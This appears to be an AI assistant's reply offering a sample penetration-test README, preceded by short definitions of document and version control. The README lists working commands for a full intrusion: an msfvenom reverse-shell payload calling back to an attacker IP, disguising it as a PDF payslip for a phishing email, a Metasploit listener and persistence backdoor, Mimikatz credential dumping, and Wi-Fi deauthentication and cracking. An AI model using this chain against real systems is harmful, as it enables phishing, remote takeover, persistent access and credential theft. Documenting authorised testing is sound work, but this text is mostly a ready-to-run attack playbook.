Below is an example explanation and a sample README.md file that you can include with your deliverables. This document also includes brief descriptions for "Document Control" and "Version Control" as used in penetration testing reports.

### **Understanding Document Control & Version Control**

- **Document Control:**  
  Document control is the process of managing changes to the report, ensuring that only the latest, authorized version is used. This includes keeping a log of changes, listing the authors, dates of revisions, and distribution details. In your report, you might simply include a section that indicates this is the initial version (e.g., Version 1.0), along with details about who prepared and approved the document.

- **Version Control:**  
  Version control involves tracking revisions made to the report over time. This helps ensure that any updates or corrections are documented. Although you might not use a sophisticated tool like Git for a report, you can still include a version history table in your report that shows the version number, date, and a summary of changes.

### **Sample README.md File**

```markdown
# Penetration Testing Project - README

## Overview
This document contains a summary of the commands used, tools employed, and the steps performed during the penetration testing engagement on the Windows 10 environment. This README.md file is provided as part of the deliverables and includes all commands, as well as additional notes and file descriptions.

## Commands and Steps Used

### 1. Reconnaissance & Scanning
- **Enable Monitor Mode (Wi-Fi testing):**
  ```bash
  airmon-ng start wlan0
  ```
- **Full Nmap Port Scan (Target IP 100.113.47.90):**
  ```bash
  nmap -sS -p- -T2 100.113.47.90
  ```
- **Service & OS Detection:**
  ```bash
  nmap -sV --version-light -T2 100.113.47.90
  ```

### 2. Payload Generation
- **Generate a 64-bit Meterpreter Reverse Shell Payload:**
  ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=100.123.236.70 LPORT=9001 -e x64/xor -f exe > payload.exe
  ```
- **Disguise the Payload:**  
  The payload's icon was changed using Resource Hacker to look like a legitimate PDF file. (This was performed via the Resource Hacker GUI.)

### 3. Phishing Email Deployment (Using Gophish)
- **Hosting the Payload File:**  
  On the attacker machine:
  ```bash
  cp ~/payload.exe Payslip.exe
  cd /var/www/html
  python3 -m http.server 8080
  ```
- **Email Template Used in Gophish:**
  ```
  Subject: Your February Payslip is Now Available
  From: no-reply <noreplyspri@gmail.com>
  To: sprintspro123@outlook.com

  Dear Sprints,

  I hope this email finds you well.

  ```

### 4. Exploitation & Reverse Shell Acquisition
- **Start Metasploit Listener:**
  ```bash
  msfconsole
  use exploit/multi/handler
  set payload windows/x64/meterpreter/reverse_tcp
  set LHOST 100.123.236.70
  set LPORT 9001
  exploit -j
  ```

### 5. Persistence Installation
- **Install a Persistent Backdoor using Metasploit:**
  ```bash
  use windows/local/persistence
  set SESSION 1
  set LHOST 100.123.236.70
  set LPORT 9002
  exploit
  ```

### 6. Pulling Chrome Passwords
- **Using Mimikatz to Extract Credentials:**
  1. Launch an elevated command prompt on the target.
  2. Run Mimikatz:
     ```bash
     mimikatz.exe
     ```
  3. In Mimikatz, run:
     ```
     privilege::debug
     sekurlsa::logonpasswords
     ```
- **If necessary, de-hash credentials using John the Ripper/Hashcat:**
  - (Refer to attached documentation for the exact commands and wordlists used.)

### Bonus: Wi-Fi Handshake Capture & Cracking (WPA/WPA2)
- **Capture Handshake:**
  ```bash
  airodump-ng -c 6 --bssid 00:1A:2B:3C:4D:5E -w capture wlan0mon
  ```
- **Deauthenticate Client (if needed):**
  ```bash
  aireplay-ng -0 5 -a 00:1A:2B:3C:4D:5E -c 11:22:33:44:55:66 wlan0mon
  ```
- **Crack the Wi-Fi Password:**
  ```bash
  aircrack-ng -a2 -b 00:1A:2B:3C:4D:5E -w rockyou.txt capture-01.cap
  ```
